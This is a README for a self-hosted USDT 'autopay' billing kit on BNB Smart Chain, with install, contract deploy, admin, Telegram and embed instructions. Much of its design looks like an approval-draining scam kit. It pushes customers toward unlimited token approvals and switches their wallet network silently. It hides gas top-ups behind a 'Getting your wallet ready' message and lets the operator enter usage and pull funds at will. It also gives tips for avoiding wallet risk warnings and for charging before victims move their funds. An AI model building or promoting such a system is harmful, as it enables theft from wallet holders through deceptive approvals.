# Wallet Billing · BNB Smart Chain

**Crypto autopay (pay-as-you-go) in BEP-20 USDT on BNB Smart Chain, made for Trust Wallet, Binance Web3 Wallet and MetaMask.**

Your customers approve USDT once from their own wallet, use your service, and you collect what they used. This edition runs on **BNB Smart Chain only**: every page, wallet link and setting is for BSC, and a wallet that opens the page on another network (Trust Wallet often starts on Ethereum) is moved to BNB Smart Chain automatically.

Version 2.2.0 · Node.js 22+ · Self-hosted

---

## Contents

1. [Features](#1-features)
2. [How it works](#2-how-it-works)
3. [Package contents](#3-package-contents)
4. [Requirements](#4-requirements)
5. [Quick start on your computer](#5-quick-start-on-your-computer)
6. [Install on a VPS](#6-install-on-a-vps)
7. [Set up BNB Smart Chain](#7-set-up-bnb-smart-chain)
8. [Test before going live](#8-test-before-going-live)
9. [Daily use: the admin panel](#9-daily-use-the-admin-panel)
10. [Telegram alerts and Telegram control](#10-telegram-alerts-and-telegram-control)
11. [Connect your own service (API)](#11-connect-your-own-service-api)
12. [Add the Pay button to your own React website](#12-add-the-pay-button-to-your-own-react-website) (and the Activate button for any website, 12.1)
13. [Configuration reference (.env)](#13-configuration-reference-env)
14. [Customization](#14-customization)
15. [Backups, updates and monitoring](#15-backups-updates-and-monitoring)
16. [Security](#16-security)
17. [Troubleshooting](#17-troubleshooting)
18. [FAQ](#18-faq)
19. [Credits and licenses](#19-credits-and-licenses)

---

## 1. Features

- **BNB Smart Chain only (BEP-20 USDT):** one network, nothing else to configure. Wallets that open the page on another network are switched to BNB Smart Chain as soon as the page loads (silently in Trust Wallet and Binance Web3 Wallet); "Open in Trust Wallet" links open straight on BNB Smart Chain.
- **One confirmation to start:** the customer approves USDT once and billing is active. No second "activate" transaction.
- **Prepaid mode (`PREPAID=1`): no approval, no warning.** The customer pays up front with a normal USDT transfer; the server verifies it on-chain and credits them, usage draws it down. No approval popup, no contract, no keeper — a plain "send" the wallet shows without any warning. Quick-pick amounts with `PREPAID_AMOUNTS`.
- **Approve exactly the wallet balance (`APPROVE_FROM_BALANCE`, capped mode):** read the balance before connecting and approve that specific number — no "unlimited" warning, and the approval fits each customer. Optional `MIN_BALANCE` turns away wallets below a minimum with your own message.
- **No-limit mode (`APPROVE_MODE=strict`, default):** unlimited approval only, no customer limits on the page. A customer who approves less (some wallets let them edit the amount) or sets limits straight on the contract is paused until they approve in full again, so nobody can use the service and then block the charges. `unlimited` (customers may add their own limits) and `capped` (a set amount, fewer wallet warnings) are also available.
- **Billing page:** opens straight into the wallet card inside Trust Wallet / Binance Web3 Wallet / MetaMask: USDT balance and BNB for fees before any connect popup, one **Approve USDT and start** button, API key, usage, cancel.
- **Activate button for any website:** two lines of HTML (`embed.js`) put an Activate button on another site's home page, connected to this billing server; the customer comes back with billing on (section 12.1).
- **Gas drop (no BNB, no problem):** a customer with USDT but no BNB for the approval fee gets 0.00007 BNB from the keeper (enough for one transaction, about 5 US cents), only when they press Approve, up to 3 times per wallet (a retry if the approval didn't go through), within a daily cap. They only see "Getting your wallet ready…".
- **Charges you start:** admin panel or Telegram. The keeper wallet collects what is due into your treasury, never more than the approval and the customer's balance.
- **Admin panel, Withdraw page for staff, Telegram alerts and bot control, payment QR, React integration.**
- **Self-hosted:** your server, your database, your keys. No third party holds funds.

---

## 2. How it works

1. You deploy the **TokenBilling** contract on BNB Smart Chain once (Deploy page, about 0.01 BNB).
2. The customer opens your billing page in their wallet and approves USDT for the contract: one confirmation.
3. Your service reports usage (or you add it by hand in the admin panel). It adds up as **due**.
4. You press **Charge** (admin panel or Telegram). The **keeper wallet** collects the due amount into your **treasury**.

Nothing is charged automatically; every charge is started by you.

| Wallet | Role | Where its key lives |
|---|---|---|
| **Owner** | Deploys the contract; can pause it, change keeper or treasury, transfer ownership | Your own wallet app. Never on the server. |
| **Treasury** | Receives all payments | Your own wallet. Only its address is used. |
| **Keeper** | Sends charge transactions; needs a little BNB | Server `.env` (`KEEPER_PRIVATE_KEY`). It can only ever send money to the treasury. |

For each customer the server calculates **credit left** = the lowest of (approval, wallet balance) minus what is already due. It re-reads the blockchain regularly, so if a customer revokes the approval or empties the wallet, your service stops serving them.

---

## 3. Package contents

```
wallet-billing-bsc/
├── backend/          Node.js server: API, billing ledger, charges, Telegram alerts and bot
│   ├── .env.example  Every setting, with comments
│   └── src/          server.js, billing.js, config.js, db.js, notify.js, telegramBot.js, chains/evm.js
├── site/             Customer billing page (Vite); site/public/embed.js = Activate button for other sites
├── admin/            Admin panel, Deploy page and Withdraw page (Vite)
├── contracts/        TokenBilling.sol, MockUSDT.sol (test token)
├── integrations/     React hook + button, backend example
├── documentation/    This guide as HTML
├── install.sh        One-command installer for Ubuntu VPS
├── render.yaml       One-click deploy on Render.com
├── DEVELOPER-GUIDE.md  "Connect now" button on another website: step by step
├── CHANGELOG.md
└── README.md
```

---

## 4. Requirements

**Server**
- A Linux VPS with Ubuntu 22.04 or 24.04, 1 GB RAM minimum (2 GB recommended), 10 GB disk. Any VPS provider works. Shared cPanel hosting is not recommended: the app must run all the time and needs Node.js 22.13 or newer.
- **Node.js 22.13 or newer**. The installer sets it up.
- A domain or subdomain (e.g. `billing.yourdomain.com`) for HTTPS. Wallet apps require HTTPS.

**Wallets and funds**

| Wallet | What it needs |
|---|---|
| Owner (deploys the contract, MetaMask on a desktop browser) | ~0.01 BNB |
| Keeper (pays charge fees and gas drops) | ~0.005–0.02 BNB |
| Treasury | Your own BNB Smart Chain address (`0x…`). Not an exchange deposit address. |

**Recommended:** your own RPC endpoint (Ankr, QuickNode, NodeReal…) and a Telegram bot.

---

## 5. Quick start on your computer

Use this to try the project before installing it on a server.

```bash
cd backend
cp .env.example .env            # Windows: copy .env.example .env
```

Open `backend/.env` and set at least:

```ini
SERVICE_NAME=My Service
CHAINS=bsc
ADMIN_KEY=put-a-long-random-password-here-32chars
TREASURY_WALLET=0xYourTreasuryAddress
```

Install, build and start:

```bash
cd backend && npm install
cd ../site  && npm install && npm run build
cd ../admin && npm install && npm run build
cd ../backend && npm start
```

| Open | What |
|---|---|
| http://localhost:3001/ | Customer billing page |
| http://localhost:3001/admin/ | Admin panel (password = `ADMIN_KEY`) |
| http://localhost:3001/admin/deploy.html | Deploy page |
| http://localhost:3001/api/health | Server and network status |

For front-end development keep the backend running and use `npm run dev` in `site/` (port 3000) or `admin/` (port 3002). Both forward `/api` to the backend.

---

## 6. Install on a VPS

### 6.0 One-command install (recommended)

For a fresh **Ubuntu 22.04 / 24.04** server. First create the DNS A record for your domain (step 6.1 below), then:

```bash
# on your computer: upload the zip
scp wallet-billing-*.zip root@YOUR_SERVER_IP:/root/

# on the server
ssh root@YOUR_SERVER_IP
apt -y install unzip && unzip wallet-billing-*.zip && cd wallet-billing
sudo bash install.sh
```

The installer asks a few questions (domain, business name, unit, price per unit, treasury addresses) and then does everything in sections 6.3 to 6.10 for you:

- installs Node.js 22, PM2, SQLite and adds swap on small servers,
- creates the `app` user and copies the project to `/home/app/wallet-billing`,
- creates `backend/.env` with a new random `ADMIN_KEY` and `SERVICE_API_KEY`,
- installs dependencies and builds the billing page and admin panel,
- starts the app with PM2 and makes it start after a reboot,
- opens the firewall (SSH, 80, 443), sets up HTTPS with Caddy for your domain,
- adds a daily database backup.

At the end it prints your admin URL, admin password and service API key (also saved in `/home/app/wallet-billing-access.txt`). Continue with [section 7](#7-set-up-each-blockchain).

Without questions (for example in a script):

```bash
sudo bash install.sh --yes --domain billing.yourdomain.com --name "My Service" \
  --treasury 0xYourTreasury \
  --unit credits --price 0.002
```

Other options: `--no-ssl` (no domain, opens port 3001, for testing), `--no-firewall`, `--skip-system` (you already manage Node.js, PM2 and the web server yourself), `--help`.

**Update to a new version:** upload and unzip the new version, then from its folder run `sudo bash install.sh --update`. Your settings and data are kept and the database is backed up first.

The installer is safe to run again: it keeps an existing `.env`, data and backups.

### 6.0b Deploy on Render.com (testing, or hosting without a VPS)

The package includes `render.yaml`. Push the folder to a **private** GitHub repository (never commit `backend/.env`), then in Render: **New → Blueprint** → pick the repository. Render builds everything and starts the server; fill in the environment variables it asks for (treasury, contract, keeper key…) in the service's **Environment** tab.

- The database is a SQLite file, so the service needs Render's **persistent disk** (`/var/data`, paid Starter instance plus the disk). On the **free plan** remove the `disk` block from `render.yaml` for a quick test: it works, but all data (customers, usage, API keys) is lost on every deploy or restart, and the free instance sleeps after 15 minutes without visitors, which also pauses the Telegram bot and customer discovery.
- Point your domain at the service in Render's **Custom Domains** (HTTPS is automatic).
- Update: push to GitHub; Render redeploys.

### Manual install (step by step)

Prefer to do it yourself, or using another Linux distribution? These are the same steps the installer runs. Replace `billing.yourdomain.com` with your own domain.

### 6.1 Point your domain to the server

In your domain's DNS settings, create an **A record**:

| Type | Name | Value |
|---|---|---|
| A | `billing` | your server's IP address |

DNS changes can take a few minutes to an hour.

### 6.2 Connect to the server

```bash
ssh root@YOUR_SERVER_IP
```

(Windows: use the built-in `ssh` in PowerShell, or PuTTY.)

### 6.3 Install the basics, firewall and swap

```bash
apt update && apt -y upgrade
apt -y install curl unzip sqlite3 ufw ca-certificates gnupg

ufw allow OpenSSH
ufw allow 80
ufw allow 443
ufw --force enable

# 2 GB swap (helps small servers when building)
fallocate -l 2G /swapfile && chmod 600 /swapfile && mkswap /swapfile && swapon /swapfile
echo '/swapfile none swap sw 0 0' >> /etc/fstab
```

### 6.4 Install Node.js 22 and PM2

```bash
curl -fsSL https://deb.nodesource.com/setup_22.x | bash -
apt -y install nodejs
node -v            # must show v22.13 or newer
npm install -g pm2
```

### 6.5 Create a user for the app

Running the app as a normal user (not root) is safer.

```bash
adduser --disabled-password --gecos "" app
mkdir -p /home/app/data /home/app/backups
chown -R app:app /home/app
```

### 6.6 Upload the files

From **your computer**, upload the zip (or use FileZilla / WinSCP with SFTP to `/home/app/`):

```bash
scp wallet-billing.zip root@YOUR_SERVER_IP:/home/app/
```

Then on the server:

```bash
cd /home/app
unzip wallet-billing.zip
chown -R app:app /home/app/wallet-billing
```

### 6.7 Create the settings file

```bash
su - app
cd ~/wallet-billing/backend
cp .env.example .env
chmod 600 .env
openssl rand -hex 24     # run twice: one value for ADMIN_KEY, one for SERVICE_API_KEY
nano .env
```

Set at least these values (save in nano with `Ctrl+O`, `Enter`, exit with `Ctrl+X`):

```ini
SERVICE_NAME=Your Business Name
CHAINS=bsc
ADMIN_KEY=<first random value>
SERVICE_API_KEY=<second random value>
TREASURY_WALLET=0xYourTreasury
UNIT_NAME=credits
PRICE_PER_UNIT=0.002
DB_PATH=/home/app/data/billing.db
```

The contract addresses and keeper keys are added in [step 7](#7-set-up-each-blockchain).

### 6.8 Install and build

Still as user `app`:

```bash
cd ~/wallet-billing/backend && npm install
cd ~/wallet-billing/site    && npm install && npm run build
cd ~/wallet-billing/admin   && npm install && npm run build
```

### 6.9 Start the app and keep it running

```bash
cd ~/wallet-billing/backend
pm2 start npm --name billing -- start
pm2 save
exit                     # back to root
env PATH=$PATH:/usr/bin pm2 startup systemd -u app --hp /home/app
```

The app now starts automatically after a reboot. Check it: `curl http://localhost:3001/api/health`.

### 6.10 HTTPS with Caddy

Caddy gets and renews the SSL certificate automatically.

```bash
apt -y install debian-keyring debian-archive-keyring apt-transport-https
curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/gpg.key' | gpg --dearmor -o /usr/share/keyrings/caddy-stable-archive-keyring.gpg
curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/debian.deb.txt' | tee /etc/apt/sources.list.d/caddy-stable.list
apt update && apt -y install caddy
```

Replace the contents of `/etc/caddy/Caddyfile` (`nano /etc/caddy/Caddyfile`) with:

```
billing.yourdomain.com {
    encode gzip
    reverse_proxy localhost:3001
}
```

```bash
systemctl reload caddy
```

Open `https://billing.yourdomain.com/api/health`. Then `https://billing.yourdomain.com/admin/` and log in with your `ADMIN_KEY`.

<details>
<summary>Prefer Nginx? (alternative to Caddy)</summary>

```bash
apt -y install nginx certbot python3-certbot-nginx
cat > /etc/nginx/sites-available/billing <<'EOF'
server {
    server_name billing.yourdomain.com;
    location / {
        proxy_pass http://127.0.0.1:3001;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
EOF
ln -s /etc/nginx/sites-available/billing /etc/nginx/sites-enabled/
nginx -t && systemctl reload nginx
certbot --nginx -d billing.yourdomain.com
```
</details>

### 6.11 Next steps

1. [Set up each blockchain](#7-set-up-each-blockchain) on the Deploy page.
2. Connect [Telegram](#10-telegram-alerts-and-telegram-control).
3. Run the [tests](#8-test-before-going-live) with small amounts.
4. Turn on [daily backups](#15-backups-updates-and-monitoring).

---

## 7. Set up BNB Smart Chain

1. Open `https://billing.yourdomain.com/admin/deploy.html` on a **desktop browser** with MetaMask installed.
2. In MetaMask select your **owner** account (with ~0.01 BNB) → **Connect MetaMask** → switch to BNB Smart Chain if asked.
3. **Create a new keeper wallet**. Copy the private key into a password manager and tick "I saved the private key".
4. Check the **treasury** address.
5. **Deploy contract** → confirm in MetaMask. Check Owner, Token, Treasury and Keeper in the result.
6. **Send to keeper**: a little BNB for charge fees.
7. **Copy all** → paste into `backend/.env` (`BILLING_CONTRACT_BSC`, `BILLING_START_BLOCK_BSC`, `KEEPER_PRIVATE_KEY`) → restart (`pm2 restart billing` as user `app`, or redeploy on Render).
8. Admin panel → **Billing**: the card should show **Running**, the keeper's BNB balance and no red messages.

**Verify the contract on BscScan** (lowers wallet warnings): Contract → Verify and Publish → Solidity (Single file), compiler **v0.8.26+commit.8a97fa7a**, license **MIT**, optimization **Yes / 200 runs**, EVM version **paris**, source `contracts/TokenBilling.sol`, constructor arguments as shown on the Deploy page.

> **Installing for a client?** Set the client's wallet as treasury, deploy, then use **Transfer ownership** on the Deploy page so the client owns the contract.

---

## 8. Test before going live

From a second wallet with about 5 USDT and a little BNB:

1. Open the billing page inside Trust Wallet (or Binance Web3 Wallet) → **Approve USDT and start** (one confirmation) → **Create API key**.
2. Admin → **Record usage** worth 1 USDT → **Charge** → status **paid**, 1 USDT arrives in the treasury.
3. Test your API key:
   ```bash
   curl -X POST https://billing.yourdomain.com/api/service/check \
     -H "x-service-key: YOUR_SERVICE_API_KEY" -H "content-type: application/json" \
     -d '{"apiKey":"sk_..."}'
   ```
4. Revoke the approval (revoke.cash or **Cancel billing** on the page). Within a minute the admin shows "approval revoked" / "cancelled" and `check` returns `ok: false`.
5. Deploy page → **Pause all billing** → a charge fails with "paused" → **Unpause**.

Free test network: set `CHAINS=bsc-testnet` and `TOKEN_ADDRESS_BSC_TESTNET=` your MockUSDT (`contracts/MockUSDT.sol`), with test BNB from the BNB Chain faucet.

---

## 9. Daily use: the admin panel

| Section | What you do there |
|---|---|
| Withdraw page (separate, `admin/withdraw.html`) | For staff: approved customers, approved amount, available balance, usage, due, **Withdraw**. Own password `WITHDRAW_KEY` |
| Network cards | Connection, token, contract, Running / Paused, keeper gas, problems in red |
| Telegram | Bot token, chat, which alerts to send, bot commands on/off, extra admins |
| Record usage | Add usage by hand for a customer; **Add customer** by network + wallet address |
| Billing settings | Price per unit, default limits, minimum approval |
| Customers | Per network + wallet: status, limits, approved, balance, used, **due**, **can charge now**, **credit left**, **Charge**, **Block** |
| Charges | History with network, amount, status (pending, sent, paid, failed), transaction link and error |

### Withdraw page (staff)

`https://billing.yourdomain.com/admin/withdraw.html`, password `WITHDRAW_KEY` (the installer creates one; the admin key works there too). For the person who collects money without touching anything else:

| Column | Meaning |
|---|---|
| Customer | `#id`, wallet (explorer link), label; **History** (usage and withdrawals) and **+ usage** (record units used) |
| Approved / Available balance | The customer's approval and current token balance on-chain |
| Used / Due | Units used and their cost; what is still due after what was paid |
| Can withdraw | What can be collected now: the due amount, within the approval, balance and the customer's limits |
| Withdraw | Collects that amount (or a smaller one you type) into the treasury, with a confirmation |

Everything else (settings, Deploy page, Telegram, blocking) needs the admin key.

**How often to charge?** Your choice: daily, weekly, or when the due amount passes a threshold. Frequent, small charges stay under customers' per-charge limits and reduce the risk of a customer emptying the wallet first.

---

## 10. Telegram alerts and Telegram control

### Connect the bot

1. In Telegram open **@BotFather** → `/newbot` → copy the token.
2. Admin → **Telegram alerts** → paste the token → **Save**.
3. Open your bot and press **Start** (or add it to a group and send a message).
4. **Find my chat** → **Send test**.
5. Choose which alerts to send: wallet connected, approval given / changed / revoked, billing activated / limits changed / cancelled, charge paid / failed, customer out of credit, network down / keeper low on gas.

### Manage billing from the bot

Send `/start` to the bot for a menu with buttons. The same actions work as commands:

| Command | Does |
|---|---|
| `/status` | Network (connected, keeper gas), customers, usage and money collected |
| `/customers` | Customer list; tap one for details and actions |
| `/find text` (or just type it) | Search by `#id`, address (or part of it), label or email |
| `/user who` | Full customer info |
| `/usage who units [note]` | Record usage, e.g. `/usage #12 1500 March posts` |
| `/charge who [amount]` | Charge now (asks for confirmation first) |
| `/chargeall` | Charge everyone who owes and can pay (asks for confirmation) |
| `/block who`, `/unblock who`, `/label who text` | Stop / allow a customer's API key; name a customer |
| `/add chain wallet` | Add a customer who approved but isn't listed |
| `/charges`, `/settings`, `/set price 0.002` | Recent charges; settings (`price`, `price1k`, `approve`, `percharge`, `per30`, `minapproval`) |
| `/id`, `/cancel`, `/help` | Show your IDs; cancel a question; help |

**Withdraw-only users.** User IDs in `TELEGRAM_WITHDRAW_IDS` (or the admin panel → Telegram → "Withdraw-only user IDs") get a reduced bot: `/withdraw` (approved customers with approved amount, balance, usage and due), `/user`, `/charge` with confirmation, and history. Settings, charge-all, blocking, adding customers and status are not available to them.

**Who can use the bot:** only the chat saved as Chat ID (in a group: only group admins), plus user IDs you add under **Extra admin user IDs** (or `TELEGRAM_ADMIN_IDS`). Everyone else only gets their own ID back. A charge can only be confirmed by the person who started it, and the confirmation expires after 5 minutes. Turn commands off with the checkbox or `TELEGRAM_COMMANDS=0`; alerts keep working.

The bot uses long polling: no webhook or public URL needed. Run **one** server per bot token.

---

## 11. Connect your own service (API)

Your backend calls these with the header `x-service-key: <SERVICE_API_KEY>`. Never call them from a browser.

```
POST /api/service/check   { "apiKey": "sk_..." }      (or { "wallet": "0x..." } for users who came back from the Activate button)
 -> { "ok": true, "account": "bsc:0x...", "chain": "bsc", "wallet": "0x...", "symbol": "USDT",
      "creditLeft": "18.50", "tokensLeft": 9250, "due": "11.50", "reason": null }

POST /api/service/usage   { "apiKey": "sk_...", "tokens": 1532, "note": "campaign #12" }
 -> { "cost": "3.064", "due": "14.564", "creditLeft": "15.436", "tokensLeft": 7718, "stop": false }
```

`tokens` and `tokensLeft` are counted in your own unit (`UNIT_NAME`).

1. Before serving a customer, call `check`. If `ok` is false, refuse and show `reason`.
2. Never serve more than `tokensLeft` in one request.
3. After serving, call `usage` with the real amount used.
4. If `usage` returns `stop: true`, refuse the next request until the customer approves more or you charge.

No coding yet? Record usage by hand in the admin panel (or with the Telegram bot) and charge from there.

### All routes

| Route | Auth | Purpose |
|---|---|---|
| `GET /api/health` | | Server and network status |
| `GET /api/config`, `GET /api/billing/config` | | Public settings |
| `GET /api/billing/wallet?chain=&wallet=` | | A wallet's token balance, gas coin balance, approval and limits ("Check balance") |
| `POST /api/billing/login-tx`, `GET /api/billing/login-message`, `POST /api/billing/login` | | Customer sign-in (activation transaction or signed message) |
| `POST /api/billing/register`, `GET /api/billing/me`, `POST /api/billing/api-key` | `Authorization: Bearer <session>` | Customer dashboard and API key |
| `GET /api/embed/status?wallet=&chain=` | | Is this wallet's billing on (`active`, `usable`, `reason`)? Used by the Activate button; any site may call it |
| `POST /api/billing/pay` `{wallet, chain, txHash}` | | Prepaid: verify the customer's transfer-to-treasury transaction and add the credit |
| `POST /api/service/check`, `POST /api/service/usage` | `x-service-key` | Your backend |
| `GET /api/admin/overview`, `GET /api/admin/billing` | `x-admin-key` | Admin data |
| `POST /api/admin/billing/usage` `{account, tokens, note?}` | `x-admin-key` | Add usage (`account` = `<chain>:<address>`) |
| `POST /api/admin/billing/charge` `{account, amount?}` | `x-admin-key` | Charge (no amount = maximum possible now) |
| `POST /api/admin/billing/settings`, `/add-customer`, `/account` | `x-admin-key` | Settings, add a customer, label or block |
| `GET/POST /api/admin/telegram`, `/telegram/test`, `/telegram/find-chat` | `x-admin-key` | Telegram |

---

## 12. Add the Pay button to your own React website

If you already have a website with its own Pay / Subscribe button, use `integrations/`. Your button then runs the whole setup (connect, approve, activate, sign in, API key) without the customer leaving your page.

1. Host the billing server on a subdomain (e.g. `billing.yourdomain.com`).
2. In `backend/.env` set `ALLOWED_ORIGINS=https://www.yourdomain.com,https://yourdomain.com` and restart.
3. In the React project: `npm install ethers`.
4. Copy `integrations/react/` files into the project and call `activate({ chain })` from your button.
5. Send the returned `apiKey` to your backend and store it on the user (see `integrations/server-example.js`).

Full guide with code: `integrations/README.md`.

### 12.1 Activate button for any website (no React, no build)

Step-by-step for the website's developer, with server code in Node.js, PHP and Python: **`DEVELOPER-GUIDE.md`** (also `documentation/developer-guide.html`).

Put this on the home page (or any page) of the other website, where the button should appear:

```html
<div data-wallet-billing data-label="Activate services"></div>
<script src="https://billing.yourdomain.com/embed.js" async></script>
```

1. In `backend/.env` add that website to `ALLOWED_ORIGINS` (e.g. `ALLOWED_ORIGINS=https://www.yoursite.com,https://yoursite.com`) and restart. Only these sites get the customer back after approving.
2. The customer taps **Activate services**, approves on the billing page (opened inside Trust Wallet / Binance Wallet / MetaMask as usual) and comes straight back to your page. The button then shows **Services active** with the wallet, or why it is paused (for example a limited approval in strict mode) with a link to fix it.
3. Your page's code can listen for it:

```html
<script>
  window.addEventListener('walletbilling:active', (e) => {
    // e.detail.wallet, e.detail.chain: send it to your server and store it on the logged-in user
  });
  window.addEventListener('walletbilling:paused', (e) => { /* e.detail.reason */ });
</script>
```

4. **Before serving**, your server checks the wallet with `POST /api/service/check { "wallet": "0x..." }` (header `x-service-key`), never trusting the page alone, then records usage with `POST /api/service/usage { "wallet": "0x...", "tokens": 1500 }`.

Options on the div: `data-label`, `data-active-label`, `data-chain` (multi-network installs), `data-return` (page to come back to; default the current page), `data-theme="dark"`. `window.WalletBilling.wallet()` returns the remembered wallet, `.refresh()` checks again, `.reset()` forgets it.

---

## 13. Configuration reference (.env)

Every setting is also explained in `backend/.env.example`.

| Setting | Default | Meaning |
|---|---|---|
| `SERVICE_NAME` | My Service | Your name on the billing page and in Telegram |
| `PORT` | 3001 | Server port |
| `CHAINS` | bsc | `bsc` (or `bsc-testnet` for testing). Other networks are not part of this edition |
| `BILLING_CONTRACT_BSC`, `BILLING_START_BLOCK_BSC` | | From the Deploy page |
| `KEEPER_PRIVATE_KEY` | | Keeper wallet key (from the Deploy page) |
| `TREASURY_WALLET` | | Your treasury address (pre-filled on the Deploy page) |
| `RPC_URL_BSC` | public RPC | Your own RPC for the server (recommended) |
| `BROWSER_RPC_URL_BSC` | https://bsc-dataseed.bnbchain.org | RPC the customer's browser uses to show balances. Public URL without a secret key |
| `BILLING_TOKEN_BSC` | USDT | `USDT` or `USDC` (BEP-20) |
| `ADMIN_KEY` | **required** | Admin password, 16+ characters |
| `SERVICE_API_KEY` | | Password your backend sends as `x-service-key` |
| `UNIT_NAME` | tokens | What you bill for (credits, messages, leads…) |
| `PRICE_PER_UNIT` | 0.000002 | Price of one unit in USDT. Also editable in the admin panel and the bot |
| `APPROVE_MODE` | strict | `strict` = unlimited approval only, no customer limits (a wallet that approves less or sets own limits is paused until it approves in full). `unlimited` = unlimited by default, customers may add own limits. `capped` = customers approve `DEFAULT_APPROVE` (e.g. 100 USDT) with a Top up button; fewer wallet warnings |
| `DEFAULT_APPROVE`, `DEFAULT_MAX_PER_CHARGE`, `DEFAULT_MAX_PER_30_DAYS` | 1000 / 50 / 200 | Pre-filled values (capped / unlimited modes) |
| `MIN_APPROVAL` | 0 | API keys stop working below this approval (0 = off) |
| `APPROVE_FROM_BALANCE` | 0 | Capped mode: `1` = approve the wallet's own balance (read before connecting), a specific number per customer, never "unlimited". `APPROVE_MAX` caps it (0 = no cap) |
| `MIN_BALANCE`, `MIN_BALANCE_MESSAGE` | 0 | A wallet below `MIN_BALANCE` of the token sees the message instead of the Approve button ({symbol} = token). 0 = everyone can start |
| `PREPAID`, `PREPAID_AMOUNTS` | 0 | `PREPAID=1` = no approval: the customer pays up front with a normal transfer (no contract or keeper needed); usage draws it down. `PREPAID_AMOUNTS` sets the quick-pick amounts |
| `QUICK_SETUP` | 1 | Quick setup page (balance at once, one Approve button) |
| `ALLOWED_ORIGINS` | | Websites that use the React integration or the Activate button (`embed.js`), comma-separated |
| `GAS_DROP` | 1 | Gas drop on/off |
| `GAS_DROP_AMOUNT_BSC` | auto | Gas drop size in BNB (`auto` = enough for one transaction, at least 0.00007 BNB). The keeper must keep at least 0.0005 BNB above it, or drops pause and Telegram warns you |
| `GAS_DROP_MIN_TOKEN`, `GAS_DROP_PER_WALLET`, `GAS_DROP_DAILY_MAX` | 0 / 3 / 50 | Minimum USDT for a drop (0 = none); most drops per wallet (a minute apart, none once billing is active); most drops per day |
| `WITHDRAW_KEY` | | Staff password for the Withdraw page. At least 12 characters, different from `ADMIN_KEY` |
| `TELEGRAM_BOT_TOKEN`, `TELEGRAM_CHAT_ID` | | Telegram (or set in the admin panel) |
| `TELEGRAM_ADMIN_IDS`, `TELEGRAM_WITHDRAW_IDS`, `TELEGRAM_COMMANDS` | | Extra bot admins, withdraw-only users; `0` = alerts only |
| `REOWN_PROJECT_ID` | | Optional WalletConnect QR on the billing page (free ID from Reown) |
| `DB_PATH` | backend/billing.db | Database file location |
| `TRUST_PROXY` | 1 | Number of proxies in front (Caddy / Nginx = 1) |

---

## 14. Customization

| What | Where |
|---|---|
| Business name | `SERVICE_NAME` in `.env` |
| Unit name and price | `UNIT_NAME`, `PRICE_PER_UNIT` in `.env`, or admin → Billing settings |
| Logo / app icon | Replace `site/public/icon*.png` (keep the sizes) and the names in `site/public/manifest.webmanifest` |
| Colors and fonts | CSS variables at the top of `site/src/style.css` and `admin/src/style.css` |
| Page texts | `site/index.html` and `site/src/app.js` |

Rebuild after front-end changes: `npm run build` in `site/` and/or `admin/`, then `pm2 restart billing`.

**dApp mode:** inside a wallet app's browser on a phone, on an `app.` / `dapp.` subdomain, or with `?dapp=1`, the billing page connects the wallet automatically and uses a compact layout. Customers can also add the page to their home screen.

---

## 15. Backups, updates and monitoring

**Daily database backup** (as user `app`: `crontab -e`, add one line):

```
15 3 * * * sqlite3 /home/app/data/billing.db ".backup '/home/app/backups/billing-$(date +\%F).db'" && find /home/app/backups -mtime +14 -delete
```

Download a backup now and then (`scp app@YOUR_SERVER_IP:/home/app/backups/*.db .`).

**Update to a new version:** easiest is `sudo bash install.sh --update` from the new version's folder (see 6.0). Manually: back up the database, upload the new files over the old ones (keep `backend/.env`), then as user `app`:

```bash
cd ~/wallet-billing/backend && npm install
cd ~/wallet-billing/site && npm install && npm run build
cd ~/wallet-billing/admin && npm install && npm run build
pm2 restart billing
```

**Useful commands**

| Command | Shows |
|---|---|
| `pm2 status` | Is the app running |
| `pm2 logs billing` | Live logs (charges, errors, Telegram bot actions) |
| `pm2 restart billing` | Restart after changes |
| `systemctl status caddy` | HTTPS proxy status |

Add an uptime monitor (any free service) on `https://billing.yourdomain.com/api/health`.

---

## 16. Security

- Never type a seed phrase anywhere except in the wallet app itself.
- Only the keeper key is on the server, holding a little BNB. Owner and treasury keys stay in your own wallets.
- `backend/.env` must stay private (`chmod 600`), out of Git, zips and chats. Use long random values for `ADMIN_KEY`, `SERVICE_API_KEY` and `WITHDRAW_KEY`.
- **Keeper leaked?** Deploy page → **Pause all billing** → create a new keeper → **Change keeper** → update `.env` → restart → unpause. The contract only ever pays the treasury, so a leaked keeper cannot send customers' USDT anywhere else; this is also why unlimited approvals (`APPROVE_MODE=strict`) are safe from a leaked keeper.
- **Gas drop** spends the keeper's BNB: at most `GAS_DROP_PER_WALLET` times per wallet (never once billing is active), only for wallets holding at least `GAS_DROP_MIN_TOKEN`, at most `GAS_DROP_DAILY_MAX` per day, rate-limited per IP, never when the keeper itself is low. `GAS_DROP=0` turns it off.
- **Activate button:** customers are only sent back to sites listed in `ALLOWED_ORIGINS`. The wallet the button returns can be typed by anyone: your server always checks it with `/api/service/check` before serving.
- **Wallet risk warnings** (Binance Web3 Wallet, Trust Wallet) come from the wallet's own scanner. Unlimited approvals are flagged most; `APPROVE_MODE=capped` avoids that. Also: verify the contract on BscScan, use a domain with HTTPS and some history, list the site on BNB Chain **DappBay**, and use the scanner's false-positive form if still flagged.
- Telegram: only trusted people should be bot admins; turn on Telegram two-step verification.
- Use an SSH key to log in to the VPS, keep the server updated, and back up the database daily.
- Have the contract reviewed by an experienced Solidity developer before large volumes. A deployed contract cannot be changed.
- Payment, consumer and tax rules differ by country. Check what applies to your business.

---

## 17. Troubleshooting

| Problem | Fix |
|---|---|
| Server exits with a message about `ADMIN_KEY` | Use 16+ characters, not starting with "change-this". |
| `node:sqlite` or syntax errors on start | Node is older than 22.13. Install Node 22 or 24. |
| `/api/health` shows a network "not connected" | Leave `RPC_URL_BSC` empty to test the public RPC, or use a plain RPC URL (e.g. https://bsc-dataseed.bnbchain.org). |
| The page only shows "billing API is running" | The front end isn't built: `npm run build` in `site/` and `admin/`, then restart. |
| A network is missing on the billing page | It isn't in `CHAINS`, its `.env` lines are missing, or the server wasn't restarted. |
| Wallet won't connect on the live site | The site must use HTTPS. Check the Caddy / Nginx setup. |
| React site: CORS error | Add your exact origin to `ALLOWED_ORIGINS` (scheme + host, no trailing slash) and restart. |
| "KEEPER_PRIVATE_KEY belongs to …, but the contract's keeper is …" | Deploy page → open the contract → **Change keeper**, or put the right key in `.env`. |
